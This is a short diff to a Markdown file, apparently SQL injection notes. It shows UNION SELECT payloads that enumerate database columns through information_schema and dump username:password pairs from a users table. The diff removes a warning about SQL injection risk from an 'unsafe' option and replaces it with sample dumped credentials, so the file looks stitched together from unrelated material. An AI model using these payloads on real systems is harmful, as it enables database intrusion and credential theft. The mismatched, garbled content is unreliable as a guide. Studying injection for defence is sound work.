@@ -15,6 +15,6 @@ id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns 
 id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users
 ```
 ##### Example
-> ⚠️ **Warning**
->
-> The `unsafe` option interprets the interpolated values as literals and it should be used carefully to avoid introducing SQL injection vulnerabilities.
+> admin:p4ssword
+> martin:pa$$word
+> jim:work123
